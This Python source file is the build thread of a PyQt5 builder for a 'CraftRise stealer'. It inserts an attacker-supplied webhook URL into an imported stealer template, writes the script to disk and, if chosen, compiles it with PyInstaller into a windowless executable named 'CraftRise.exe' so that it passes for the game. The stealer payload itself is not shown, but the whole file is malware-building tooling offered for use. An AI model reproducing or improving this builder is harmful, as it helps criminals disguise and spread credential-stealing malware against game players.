"""Build worker thread for generating the standalone payload."""

from __future__ import annotations

import os
import subprocess
import sys
from typing import Optional

from PyQt5.QtCore import QThread, pyqtSignal

from .template import STEALER_TEMPLATE


class BuildThread(QThread):
    """Background thread that writes the stealer script and optionally compiles it with PyInstaller.

    Signals:
        progress (int, str): Emitted as (percentage, message) pairs.
        finished (str): Emitted with the path to the final artifact on success.
        error (str): Emitted with a human-readable error description on failure.
    """

    progress = pyqtSignal(int, str)
    finished = pyqtSignal(str)
    error = pyqtSignal(str)

    def __init__(
        self,
        webhook_url: str,
        build_dir: str,
        create_exe: bool,
        mention_everyone: bool = False,
        parent: Optional[object] = None,
    ) -> None:
        super().__init__(parent)
        self.webhook_url = webhook_url
        self.build_dir = build_dir
        self.create_exe = create_exe
        self.mention_everyone = mention_everyone
        self._is_cancelled = False

    def cancel(self) -> None:
        """Request a graceful cancellation."""
        self._is_cancelled = True

    def _generate_stealer_code(self) -> str:
        """Populate the template with the user-supplied webhook URL.

        Returns:
            Complete Python source code ready to be written to disk.
        """
        code = STEALER_TEMPLATE.replace("__WEBHOOK_URL__", repr(self.webhook_url))
        code = code.replace("__MENTION_EVERYONE__", repr(self.mention_everyone))
        return code

    def _write_source(self, output_file: str) -> None:
        """Persist the generated source code.

        Args:
            output_file: Absolute path to the ``.py`` file.
        """
        code = self._generate_stealer_code()
        with open(output_file, "w", encoding="utf-8") as fh:
            fh.write(code)

    def _run_pyinstaller(self, source_file: str) -> None:
        """Invoke PyInstaller safely via ``subprocess.run``.

        Args:
            source_file: Path to the Python script to freeze.

        Raises:
            RuntimeError: If PyInstaller returns a non-zero exit code.
        """
        cmd = [
            sys.executable,
            "-m",
            "PyInstaller",
            "--onefile",
            "--noconsole",
            "--name",
            "CraftRise",
            "--distpath",
            self.build_dir,
            "--hidden-import",
            "jaraco.text",
            "--hidden-import",
            "setuptools",
            "--hidden-import",
            "platformdirs",
            source_file,
        ]

        # PyInstaller can be chatty; we pipe stdout and parse it for progress.
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            encoding="utf-8",
            errors="replace",
        )

        # Rough progress parsing based on PyInstaller output keywords.
        for line in process.stdout:  # type: ignore[union-attr]
            if self._is_cancelled:
                process.terminate()
                raise RuntimeError("Build cancelled by user.")

            line_stripped = line.strip()
            if "INFO: Building" in line_stripped:
                self.progress.emit(60, "Executable building…")
            elif "INFO: Appending archive" in line_stripped:
                self.progress.emit(80, "Finalizing executable…")
            elif "completed successfully" in line_stripped.lower():
                self.progress.emit(95, "Cleaning up…")

        process.wait()
        if process.returncode != 0:
            raise RuntimeError(
                f"PyInstaller exited with code {process.returncode}. "
                "Ensure pyinstaller is installed and the build directory is writable."
            )

    def run(self) -> None:
        """Execute the build pipeline."""
        try:
            if self._is_cancelled:
                return

            os.makedirs(self.build_dir, exist_ok=True)
            self.progress.emit(5, "Preparing build environment…")

            output_file = os.path.join(self.build_dir, "craftrise_stealer.py")
            self._write_source(output_file)
            self.progress.emit(25, "Payload source written.")

            if self._is_cancelled:
                return

            if self.create_exe:
                self.progress.emit(30, "Compiling executable with PyInstaller…")
                self._run_pyinstaller(output_file)

                # Remove intermediary .py file when EXE is produced.
                if os.path.exists(output_file):
                    os.remove(output_file)

                artifact = os.path.join(self.build_dir, "CraftRise.exe")
                self.progress.emit(100, "Build complete.")
                self.finished.emit(artifact)
            else:
                self.progress.emit(100, "Build complete.")
                self.finished.emit(output_file)

        except Exception as exc:
            if self._is_cancelled:
                self.error.emit("Build cancelled.")
            else:
                self.error.emit(str(exc))
